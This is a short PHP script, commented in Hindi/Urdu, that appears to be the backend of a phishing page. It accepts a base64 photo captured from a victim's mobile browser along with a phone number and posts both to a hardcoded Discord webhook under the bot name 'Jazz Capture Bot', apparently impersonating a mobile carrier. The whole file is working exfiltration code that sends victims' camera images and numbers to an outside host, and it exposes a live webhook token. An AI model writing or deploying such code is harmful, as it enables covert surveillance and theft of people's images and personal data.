<?php
if ($_POST['image']) {
    $image_base64 = $_POST['image'];
    $number = $_POST['number'] ?? 'unknown';
    
    // Base64 decode kar image bana
    $image_data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $image_base64));
    
    // Temporary file bana (Discord ke liye zaruri)
    $temp_file = sys_get_temp_dir() . '/captured_photo_' . $number . '.jpg';
    file_put_contents($temp_file, $image_data);
    
    // === TERA DISCORD WEBHOOK ===
    $webhook_url = 'https://discord.com/api/webhooks/1451052591126417419/xsthAlqmNbClkzX-pnpA1wsdTDPmi8tu5iQlBRKw3YfpP6KqOIFuZDdvndQH8593E1oz';
    
    $caption = "Captured Number: $number\nTime: " . date('Y-m-d H:i:s') . "\nDevice: Mobile Browser";
    
    $data = [
        'content' => $caption,
        'username' => 'Jazz Capture Bot'
    ];
    
    $post_data = [
        'payload_json' => json_encode($data),
        'file' => new CURLFile($temp_file, 'image/jpeg', 'photo_from_' . $number . '.jpg')
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Temp file delete kar
    unlink($temp_file);
    
    // Success response (optional)
    echo "Success! Photo sent.";
}
?>